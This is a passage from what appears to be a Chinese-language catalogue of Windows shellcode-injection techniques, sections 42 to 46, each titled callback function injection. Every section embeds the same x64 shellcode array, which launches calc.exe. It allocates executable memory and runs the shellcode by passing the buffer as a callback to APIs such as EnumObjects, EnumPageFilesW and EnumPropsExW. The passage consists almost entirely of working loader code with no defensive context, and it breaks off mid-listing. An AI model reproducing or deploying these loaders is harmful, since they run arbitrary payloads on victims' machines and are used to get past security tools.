<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)address,&nbsp;LGRPID_ARABIC,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>}<br></code></pre>
<h1 id="h42enumobjects"><span>42.回调函数注入 通过 EnumObjects</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;LOGFONTW&nbsp;lf&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;lf.lfCharSet&nbsp;=&nbsp;DEFAULT_CHARSET;<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;HDC&nbsp;dc&nbsp;=&nbsp;GetDC(<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumObjects(dc,&nbsp;OBJ_BRUSH,&nbsp;(GOBJENUMPROC)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>}<br></code></pre>
<h1 id="h43enumpagefilesw"><span>43.回调函数注入 通过 EnumPageFilesW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;psapi.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">36</span>}<br></code></pre>
<h1 id="h44enumpropsex"><span>44.回调函数注入 通过 EnumPropsEx</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">err</span><span class="hljs-params">(<span class="hljs-keyword">const</span>&nbsp;<span class="hljs-keyword">char</span>*&nbsp;errmsg)</span>&nbsp;</span>{<br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error:&nbsp;%s&nbsp;(%u)\n"</span>,&nbsp;errmsg,&nbsp;::GetLastError());<br><span class="linenum hljs-number"> 9</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">1</span>;<br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span>}<br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number">14</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">29</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">30</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">31</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">32</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">33</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HWND&nbsp;dummy&nbsp;=&nbsp;::GetTopWindow(<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumPropsExW(dummy,&nbsp;(PROPENUMPROCEXW)addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>}<br></code></pre>
<h1 id="h45enumpropsw"><span>45.回调函数注入 通过 EnumPropsW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;HWND&nbsp;dummy&nbsp;=&nbsp;::GetTopWindow(<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumPropsW(dummy,&nbsp;(PROPENUMPROCW)addr);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">38</span>}<br></code></pre>
<h1 id="h46enumpwrschemes"><span>46.回调函数注入 通过 EnumPwrSchemes</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;powrprof.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"PowrProf.lib"</span>)</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum 